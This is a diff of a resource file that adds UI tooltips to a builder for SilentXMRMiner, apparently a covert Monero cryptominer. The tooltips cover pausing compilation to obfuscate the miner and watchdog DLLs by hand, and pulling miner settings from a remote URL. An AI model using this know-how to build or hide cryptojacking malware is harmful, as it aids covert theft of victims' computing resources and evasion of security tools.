@@ -120,6 +120,20 @@
   <metadata name="TooltipHelper.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
     <value>17, 17</value>
   </metadata>
+  <data name="Label1.ToolTip" xml:space="preserve">
+    <value>Pauses the miner compilation when the Watchdog DLL and/or Miner DLL is compiled to allow manual obfuscation of the file. 
+You can find the file in the same folder as the miner location you specified with the name MINERFILE-watchdog.dll or MINERFILE-miner.dll. 
+After you have obfuscated the file press OK on the message box that appears to move on to the next step.</value>
+  </data>
+  <data name="Label6.ToolTip" xml:space="preserve">
+    <value>Will get the configuration for the miner from this URL and use this as the main settings. If the URL can't be reached or if the configuration is wrong, it will use the settings declared in the builder instead.
+ You can find the specific format for the configuration and other helpful things on the SilentXMRMiner GitHub wiki: https://github.com/UnamSanctam/SilentXMRMiner/wiki.</value>
+  </data>
+  <data name="Label7.ToolTip" xml:space="preserve">
+    <value>Pauses the miner compilation when the Watchdog DLL and/or Miner DLL is compiled to allow manual obfuscation of the file. 
+You can find the file in the same folder as the miner location you specified with the name MINERFILE-watchdog.dll or MINERFILE-miner.dll. 
+After you have obfuscated the file press OK on the message box that appears to move on to the next step.</value>
+  </data>
   <assembly alias="System.Drawing" name="System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
   <data name="$this.Icon" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
     <value>
